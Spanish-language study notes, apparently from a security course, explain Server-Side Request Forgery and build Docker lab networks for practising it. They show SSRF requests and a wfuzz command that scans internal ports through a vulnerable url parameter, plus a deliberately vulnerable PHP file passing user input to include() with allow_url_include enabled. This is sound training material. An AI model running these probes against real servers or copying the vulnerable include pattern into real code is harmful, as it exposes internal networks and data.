---
tags:
  - Web
  - Explotacion
  - SSRF
---

# Notas

En el servidor de las páginas web pueden haber puertos que estén abiertos pero solamente en la red local, por lo que el exterior no puede ver si este puerto esta abierto o no.

Por ello podemos ver que puertos están abiertos de la siguiente manera:

Si en la web podemos ingresar una url de otra web en la solicitud, vamos a apuntar a la misma máquina con 127.0.0.1 e ir poniendo los puertos:

```http
http://172.17.0.2/utility.php?url=http://127.0.0.1

http://172.17.0.2/utility.php?url=http://127.0.0.1:33

http://172.17.0.2/utility.php?url=http://127.0.0.1:800

http://172.17.0.2/utility.php?url=http://127.0.0.1:4646
```

En el caso de que haya uno abierto y haya dentro contenido lo vamos a poder visualizar.

Para realizarlo más rápido:

```bash
sudo wfuzz -c -t 200 --hl=3 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```

**CON ESTO VEMOS INFORMACIÓN CONFIDENCIAL**


## Subnetting

En el caso de que la maquina victima este en una sub red y en esta subred haya más máquinas conectadas, podemos ingresar a través de ella como atacante utilizando la máquina de la página web (PRODUCCIÓN).

Se realizaría de la siguiente manera desde el navegador:

```
http://172.17.0.2/utility.php?url=http://10.10.0.3:7878/
```

# Hack4u

El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad de seguridad en la que un atacante puede forzar a un servidor web para que realice solicitudes HTTP en su nombre.

En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para enviar una solicitud HTTP a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso.

El ataque de SSRF puede permitir al atacante acceder a información confidencial, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) ejecutar comandos en el servidor web o en otros servidores en la red interna.

Una de las **diferencias** clave entre el **SSRF** y el **CSRF** es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante **no necesita engañar a un usuario legítimo** para hacer clic en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa.

Para prevenir los ataques de SSRF, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario y limiten el acceso del servidor web a los recursos de la red interna. Además, los servidores web deben ser configurados para limitar el acceso a los recursos sensibles y restringir el acceso de los usuarios no autorizados.

En esta clase, estaremos utilizando **Docker** para crear **redes personalizadas** en las que podremos simular un escenario de **red interna**. En esta red interna, intentaremos a través del SSRF apuntar a un recurso existente que no es accesible externamente, lo que nos permitirá explorar y comprender mejor la explotación de esta vulnerabilidad.

Para crear una nueva red en Docker, podemos utilizar el siguiente comando:

➜ `docker network create --subnet=<subnet> <nombre_de_red>`

Donde:

- **subnet**: es la dirección IP de la subred de la red que estamos creando. Es importante tener en cuenta que esta dirección IP debe ser única y no debe entrar en conflicto con otras redes o subredes existentes en nuestro sistema.
- **nombre_de_red**: es el nombre que le damos a la red que estamos creando.

Además de los campos mencionados anteriormente, también podemos utilizar la opción ‘**–driver**‘ en el comando ‘docker network create’ para especificar el controlador de red que deseamos utilizar.

Por ejemplo, si queremos crear una red de tipo “**bridge**“, podemos utilizar el siguiente comando:

➜ `docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`

En este caso, estamos utilizando la opción ‘**–driver=bridge**‘ para indicar que deseamos crear una red de tipo “**bridge**“. La opción –driver nos permite especificar el controlador de red que deseamos utilizar, que puede ser “**bridge**“, “**overlay**“, “**macvlan**“, “**ipvlan**” u otro controlador compatible con Docker.

# Laboratorio

## Lab Casero 2 maquinas

```bash
docker pull ubuntu:latest
docker run -dit --name ssrf_first_lab ubuntu
docker exec -it ssrf_first_lab bash
```

Dentro del contenedor:

```bash
apt update
apt install apache2 php nano python3 -y
service apache2 start
cd /var/www/html
nano utility.php
```

Contenido del archivo php

```php
<?php
	if(isset($_GET['url'])){
		$url = $_GET['url'];
		echo "\n[+] Listando el contenido de la web " . $url . ":\n\n";
		include($url);
	}else{
		echo "\n[+] No se ha proporcionado ningun valor para el parámetro URL\n\n";
	}
?>
```

```bash
find / -name php.ini 2>/dev/null
nano /etc/php/8.3/apache2/php.ini
```

Tiene que quedar de la siguiente manera:
	allow_url_include= On

```bash
service apache2 restart
```

```
nano login.html
```

Aquí buscamos código de un login por internet y lo metemos en el archivo
Ponemos algo que identifique que es un login de producción.

```bash
cp login.html /tmp/
cd /tmp
nano login.html
# QUITAMOS EL IDENTIFICADOR DE PRODUCCION Y PONEMOS PREPRODUCCION
python3 -m http.server 4646 --bind 127.0.0.1
```


## Lab Casero 3 máquinas

- Máquina atacante
- Victima 1 -> 172.17.0.2 <-> 10.10.0.2 
- Victima 2 ->10.0.0.3:8089

La máquina atacante no puede acceder a la máquina victima 2.
Pero las máquinas al estar en una red interna si se ven.

Máquina victima 1

```bash
docker network create --driver=bridge network1 --subnet=10.10.0.0/24
docker run -dit --name PRO ubuntu
docker network connect network1 PRO
```


Máquina victima 2

```bash
docker run -dit --name PRE --network=network1 ubuntu
```

Máquina atacante

```bash
docker run -dit --name ATTACKER ubuntu
```